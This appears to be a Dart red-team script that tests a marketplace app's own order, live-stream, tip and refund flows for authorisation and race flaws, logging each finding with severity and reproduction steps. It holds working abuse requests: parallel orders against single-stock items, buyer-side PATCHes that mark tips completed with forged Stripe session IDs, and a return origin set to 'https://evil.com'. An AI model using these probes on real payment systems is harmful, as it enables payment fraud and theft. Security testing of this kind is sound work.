/// Pass 4 — live real (Edge seller) + unlist fora do catálogo live; race; tips; refund pós-envio.
import 'dart:io';
import '_rt.dart';

bool persisted(HttpR r) =>
    r.ok && (r.list.isNotEmpty || (r.map != null && r.map!['id'] != null));

Future<void> main() async {
  final c = Rti4(loadEnv());
  await c.boot();

  // ---- Race qty=1 (sem coluna extra) ----
  final raceP = await c.insertProduct(
    listed: true,
    sold: false,
    title: '$prefix-RACE2',
    qty: 1,
  );
  if (raceP != null) {
    final pid = raceP['id'].toString();
    final rs = await Future.wait([
      c.insertOrder(token: c.buyerJwt, productId: pid, qty: 1),
      c.insertOrder(token: c.buyerJwt, productId: pid, qty: 1),
      c.insertOrder(token: c.buyerJwt, productId: pid, qty: 1),
      c.insertOrder(token: c.buyerJwt, productId: pid, qty: 1),
    ]);
    final held = <String>[];
    for (final r in rs) {
      c.note('p1.race2', 'parallel insert', r.brief, well: '1');
      final oid = c.orderIdOf(r);
      if (oid == null) continue;
      final row = await c.getOne('orders', oid, select: 'id,status,quantity');
      final st = '${row?['status'] ?? ''}'.toLowerCase();
      if (['reserva_pendente', 'reservado', 'aguarda_confirmacao'].contains(st)) {
        held.add(oid);
      }
    }
    final prod = await c.getOne('products', pid, select: 'id,quantity,is_sold');
    c.note('p1.race2.result', 'holds', {'n': held.length, 'product': prod}, well: '1');
    if (held.length >= 2) {
      final chk0 = await c.checkout(token: c.buyerJwt, orderId: held[0], productId: pid);
      final chk1 = await c.checkout(token: c.buyerJwt, orderId: held[1], productId: pid);
      final s0 = chk0.ok &&
          '${chk0.map?['checkoutUrl'] ?? chk0.map?['session_id'] ?? ''}'.isNotEmpty;
      final s1 = chk1.ok &&
          '${chk1.map?['checkoutUrl'] ?? chk1.map?['session_id'] ?? ''}'.isNotEmpty;
      c.note('p1.race2.sessions', 'dual session?', {
        's0': s0,
        's1': s1,
        'c0': clip(chk0.body, 180),
        'c1': clip(chk1.body, 180),
      }, well: '1');
      if (s0 && s1) {
        c.finding(
          id: 'P1-RACE-DUAL-SESSION',
          title: 'qty=1 dois holds e duas Sessions',
          actor: 'buyer JWT paralelo',
          sev: 'P2',
          well: '1',
          pre: 'quantity=1',
          request: '4× POST orders; 2× checkout',
          before: raceP,
          after: {'held': held.length, 's0': s0, 's1': s1, 'product': prod},
          impact: 'SESSION CRIADA duplicada; captura permanente não neste passo',
          repro: 'parallel POST orders qty=1',
        );
      } else {
        c.hold('p1.race2.sessions', 'sem duas Sessions económicas', {
          'held': held.length,
          's0': s0,
          's1': s1,
        }, well: '1');
      }
    } else {
      c.hold('p1.race2', '≤1 hold qty=1', {'held': held.length}, well: '1');
    }
  }

  // ---- Seller cria live via Edge (actor real) ----
  final mux = await c.edge(
    'create-mux-live',
    {'title': '$prefix live unlist bypass'},
    token: c.sellerJwt,
  );
  c.note('p1.mux.create', 'create-mux-live seller', clip(mux.body, 400), well: '1');
  var liveId = '${mux.map?['live_id'] ?? mux.map?['id'] ?? ''}';
  if (liveId.isEmpty && mux.map?['live'] is Map) {
    liveId = '${(mux.map!['live'] as Map)['id'] ?? ''}';
  }

  // Fallback fixture: mundo «seller em directo» (não actor do exploit)
  if (liveId.isEmpty) {
    final li = await c.rest(
      'POST',
      'lives',
      service: true,
      body: {
        'seller_id': c.sellerId,
        'vendedor_id': c.sellerId,
        'title': '$prefix-LIVE-NOW',
        'status': 'live',
        'is_active': true,
      },
    );
    c.note('p1.live.fixture', 'service world-state live', li.brief, well: '1');
    if (li.list.isNotEmpty) liveId = '${(li.list.first as Map)['id']}';
  }
  if (liveId.isNotEmpty) c.createdLiveIds.add(liveId);

  final unlist = await c.insertProduct(
    listed: false,
    sold: false,
    title: '$prefix-BACKROOM',
    qty: 1,
    price: 4.5,
  );

  if (liveId.isNotEmpty && unlist != null) {
    final liveRow = await c.getOne(
      'lives',
      liveId,
      select: 'id,status,is_active,seller_id',
    );
    c.note('p1.live.now', 'live used', liveRow, well: '1');

    // Hub vs PostgREST
    final hubP = await c.rest(
      'GET',
      'hub_products_public?id=eq.${unlist['id']}&select=id',
    );
    final o = await c.insertOrder(
      token: c.buyerJwt,
      productId: unlist['id'].toString(),
      liveId: liveId,
    );
    c.note('p1.backroom.order', 'unlist + live_id activo, SEM live_item', {
      'hub': hubP.list.length,
      'order': o.brief,
      'live': liveRow,
    }, well: '1');

    if (persisted(o)) {
      final oid = c.orderIdOf(o)!;
      final chk = await c.checkout(
        token: c.buyerJwt,
        orderId: oid,
        productId: unlist['id'].toString(),
        extra: {'live_id': liveId},
      );
      final url = '${chk.map?['checkoutUrl'] ?? chk.map?['url'] ?? ''}';
      final session = chk.ok && url.contains('checkout.stripe.com');
      File('tool/redteam_blind_indep_$stamp/out/backroom_checkout.json')
          .writeAsStringSync(chk.body);
      c.finding(
        id: 'P1-LIVE-UNLIST-NO-ITEM',
        title: 'Directo activo vende SKU unlist que não está no catálogo live (Hub vazio)',
        actor: 'buyer JWT',
        sev: session ? 'P1' : 'P2',
        well: '1',
        pre:
            'list_on_marketplace=false; Hub 0 rows; live status=${liveRow?['status']} is_active=${liveRow?['is_active']}; produto NÃO em live_items',
        request: 'POST orders live_id; POST create-payment-intent',
        before: {'product': unlist, 'hub_n': hubP.list.length, 'live': liveRow},
        after: {
          'order': o.brief,
          'checkout': clip(chk.body, 400),
          'session': session,
          'checkoutUrl': url.length > 80 ? url.substring(0, 80) : url,
        },
        impact: session
            ? 'Session Stripe para SKU fora da montra e fora do catálogo do directo'
            : 'Hold de stock em SKU morto via live_id',
        repro:
            'Durante live do seller: POST orders product=unlist live_id=live activa; create-payment-intent',
      );

      // Tentar captura via e2e settle se houver PI — senão documentar Session≠captura
    } else {
      c.hold('p1.backroom.order', 'hold unlist+live activo bloqueado', o.brief, well: '1');
    }

    // Terminar live (não deixar directo a correr)
    await c.rest(
      'PATCH',
      'lives?id=eq.$liveId',
      service: true,
      body: {'is_active': false, 'status': 'ended'},
    );
    final endEdge = await c.edge(
      'complete-mux-live',
      {'live_id': liveId},
      token: c.sellerJwt,
    );
    c.note('p1.live.end', 'end live', endEdge.brief, well: '1');
  }

  // ---- Tips on ended live (service world-state: gravado) ----
  final ended = await c.rest(
    'POST',
    'lives',
    service: true,
    body: {
      'seller_id': c.sellerId,
      'title': '$prefix-ENDED-TIP',
      'status': 'ended',
      'is_active': false,
    },
  );
  String? endedId;
  if (ended.list.isNotEmpty) endedId = '${(ended.list.first as Map)['id']}';
  if (endedId != null) {
    c.createdLiveIds.add(endedId);
    final tipPend = await c.rpc(
      'batata_create_live_tip_pending',
      {
        'p_live_id': endedId,
        'p_seller_id': c.sellerId,
        'p_amount': 5,
        'p_stripe_session_id': 'cs_test_forged',
      },
      token: c.buyerJwt,
    );
    c.note('p4.tip.ended', 'tip pending gravado', tipPend.brief, well: '4');
    final tipId = '${tipPend.json ?? ''}'.replaceAll('"', '');
    if (tipId.length > 20) {
      final bind = await c.rest(
        'PATCH',
        'live_tips?id=eq.$tipId',
        token: c.buyerJwt,
        body: {'status': 'completed', 'stripe_session_id': 'cs_test_stolen'},
      );
      final after = await c.getOne(
        'live_tips',
        tipId,
        select: 'id,status,stripe_session_id,amount',
      );
      c.note('p4.tip.patch', 'PATCH tip', {'http': bind.status, 'after': after}, well: '4');
      if ('${after?['status']}'.toLowerCase() == 'completed') {
        c.finding(
          id: 'P4-TIP-JWT-COMPLETE',
          title: 'JWT marca tip completed sem captura',
          actor: 'buyer JWT',
          sev: 'P1',
          well: '4',
          pre: 'tip pending',
          request: 'PATCH live_tips completed',
          before: tipPend.brief,
          after: after,
          impact: 'Gorjeta liquidada sem pagamento',
          repro: 'PATCH live_tips status=completed',
        );
      } else {
        c.hold('p4.tip.patch', 'tip não completed via JWT', after, well: '4');
      }

      final edgeTip = await c.edge(
        'create-live-tip-checkout',
        {
          'live_id': endedId,
          'seller_id': c.sellerId,
          'amount_eur': 1,
          'tip_id': tipId,
          'web_return_origin': 'https://evil.com',
        },
        token: c.buyerJwt,
      );
      c.note('p4.tip.edge', 'tip checkout', clip(edgeTip.body, 400), well: '4');
    }

    final wTip = await c.rpc(
      'batata_send_live_tip_from_wallet',
      {'p_live_id': endedId, 'p_seller_id': c.sellerId, 'p_amount': 1},
      token: c.buyerJwt,
    );
    c.note('p4.tip.wallet', 'wallet tip ended', wTip.brief, well: '4');
  }

  // Hub reviews (cols reais)
  final hr = await c.rest(
    'GET',
    'hub_reviews_public?select=id,author_display,comment,stars,target_id&limit=8',
  );
  c.note('p3.hub.reviews2', 'hub_reviews_public', {
    'http': hr.status,
    'n': hr.list.length,
  }, well: '3');

  final hp = await c.rest(
    'GET',
    'hub_profiles_public?select=id,handle,full_name,location&limit=5',
  );
  c.note('p3.hub.profiles2', 'hub_profiles', {'http': hp.status, 'n': hp.list.length},
      well: '3');

  // Refund seller after enviado (order from pass2 if still enviado)
  final shipped = await c.rest(
    'GET',
    'orders?buyer_id=eq.${c.buyerId}&status=eq.enviado&select=id,status,stripe_payment_intent_id,amount_paid_cents&order=created_at.desc&limit=1',
    service: true,
  );
  if (shipped.list.isNotEmpty) {
    final oid = '${(shipped.list.first as Map)['id']}';
    final rf = await c.edge('refund-order', {'order_id': oid}, token: c.sellerJwt);
    c.note('p2.refund.after.ship', 'seller refund after enviado', rf.brief, well: '2');
    final after = await c.getOne(
      'orders',
      oid,
      select: 'id,status,stripe_refund_id,amount_paid_cents',
    );
    if (rf.ok && rf.map?['ok'] == true && rf.map?['skipped'] != true) {
      c.finding(
        id: 'P2-REFUND-AFTER-SHIP',
        title: 'Seller reembolsa Stripe após enviado',
        actor: 'seller JWT',
        sev: 'P1',
        well: '2',
        pre: 'status enviado + captura',
        request: 'POST refund-order',
        before: shipped.list.first,
        after: {'refund': rf.brief, 'order': after},
        impact: 'Anula venda já expedida',
        repro: 'POST refund-order after enviado',
      );
    } else {
      c.hold('p2.refund.after.ship', 'refund pós-envio bloqueado', {
        'rf': rf.brief,
        'order': after,
      }, well: '2');
    }
  }

  // Wallet release RPC as JWT
  final rel = await c.rpc(
    'batata_release_seller_wallet_for_order',
    {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    token: c.buyerJwt,
  );
  c.note('p2.release.rpc', 'release wallet JWT', rel.brief, well: '2');

  await c.dump('pass4');
  stdout.writeln('pass4 done findings=${c.findings.length} holds=${c.holds.length}');
}
